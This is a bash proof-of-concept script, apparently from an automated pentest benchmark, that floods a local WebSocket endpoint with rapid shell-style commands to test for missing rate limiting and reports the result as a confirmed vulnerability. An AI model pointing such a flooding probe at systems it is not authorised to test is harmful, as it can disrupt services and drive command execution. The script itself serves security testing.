#!/bin/bash
# POC: Demonstrates lack of rate limiting on WebSocket messages by flooding a single connection with rapid commands at 50ms intervals. Tests whether the server enforces any throttling or rejection of high-frequency messages.
# Target: ./repo
# Created: 2025-11-07T21:58:38.165Z
# Session: benchmark-XBEN-083-24-mhpe40z0

# WebSocket Message Rate Limiting DoS POC
# Sends rapid-fire commands on a single WebSocket connection
# Tests if server implements per-connection message rate limiting

TARGET_URL="${1:-ws://localhost:22222/ws}"
COMMAND="${2:-echo test}"
NUM_MESSAGES="${3:-10}"
INTERVAL_MS="${4:-50}"

echo "[*] WebSocket Message Rate Limiting DoS Test"
echo "[*] Target: $TARGET_URL"
echo "[*] Command: $COMMAND"
echo "[*] Number of messages: $NUM_MESSAGES"
echo "[*] Interval: ${INTERVAL_MS}ms between messages"
echo ""

# Create a temporary script to send multiple messages via WebSocket
TMPFILE=$(mktemp)
cat > "$TMPFILE" << 'EOF'
import sys
import asyncio
import websockets
import time

async def test_rate_limiting(uri, command, num_messages, interval_ms):
    """Send rapid messages on single connection and check for rate limiting"""
    
    success_count = 0
    error_count = 0
    response_times = []
    
    try:
        async with websockets.connect(uri) as websocket:
            print(f"[+] Connected to {uri}")
            
            for i in range(num_messages):
                try:
                    send_time = time.time()
                    
                    # Send command
                    await websocket.send(command)
                    
                    # Receive response with timeout
                    try:
                        response = await asyncio.wait_for(websocket.recv(), timeout=5)
                        recv_time = time.time()
                        elapsed = (recv_time - send_time) * 1000  # Convert to ms
                        response_times.append(elapsed)
                        
                        # Check if response is a rate limit error
                        if "429" in response or "rate limit" in response.lower() or "too many" in response.lower():
                            print(f"[!] Message {i+1}: Rate limit detected: {response[:100]}")
                            error_count += 1
                        else:
                            print(f"[+] Message {i+1}: OK ({elapsed:.1f}ms) - {response[:50]}")
                            success_count += 1
                    except asyncio.TimeoutError:
                        print(f"[!] Message {i+1}: No response (timeout)")
                        error_count += 1
                    
                    # Wait before next message
                    if i < num_messages - 1:
                        await asyncio.sleep(interval_ms / 1000.0)
                
                except Exception as e:
                    print(f"[!] Message {i+1}: Error - {str(e)}")
                    error_count += 1
            
            print(f"\n[*] Results:")
            print(f"[+] Successfully sent: {success_count}/{num_messages}")
            print(f"[!] Errors/Rate limits: {error_count}/{num_messages}")
            
            if response_times:
                avg_time = sum(response_times) / len(response_times)
                min_time = min(response_times)
                max_time = max(response_times)
                print(f"[*] Response times - Min: {min_time:.1f}ms, Max: {max_time:.1f}ms, Avg: {avg_time:.1f}ms")
                
                # Check for rate limiting signs: dramatic increase in response time
                if max_time > avg_time * 2:
                    print(f"[!] Possible rate limiting detected: Response times increased significantly")
                else:
                    print(f"[!] No rate limiting detected: Response times remained consistent")
            
            if error_count == 0 and success_count == num_messages:
                print(f"[!] VULNERABILITY CONFIRMED: All {num_messages} messages accepted without rate limiting")
                return True
            else:
                print(f"[*] Rate limiting may be in place")
                return False
    
    except Exception as e:
        print(f"[!] Connection error: {str(e)}")
        return False

if __name__ == "__main__":
    uri = sys.argv[1] if len(sys.argv) > 1 else "ws://localhost:22222/ws"
    command = sys.argv[2] if len(sys.argv) > 2 else "echo test"
    num_messages = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    interval_ms = int(sys.argv[4]) if len(sys.argv) > 4 else 50
    
    result = asyncio.run(test_rate_limiting(uri, command, num_messages, interval_ms))
    sys.exit(0 if result else 1)
EOF

# Check if Python and websockets module are available
if ! command -v python3 &> /dev/null; then
    echo "[!] Python3 not found"
    rm "$TMPFILE"
    exit 1
fi

# Check for websockets module, install if needed
if ! python3 -c "import websockets" 2>/dev/null; then
    echo "[*] Installing websockets module..."
    pip3 install websockets > /dev/null 2>&1 || pip install websockets > /dev/null 2>&1 || {
        echo "[!] Failed to install websockets module"
        rm "$TMPFILE"
        exit 1
    }
fi

python3 "$TMPFILE" "$TARGET_URL" "$COMMAND" "$NUM_MESSAGES" "$INTERVAL_MS"
RESULT=$?
rm "$TMPFILE"
exit $RESULT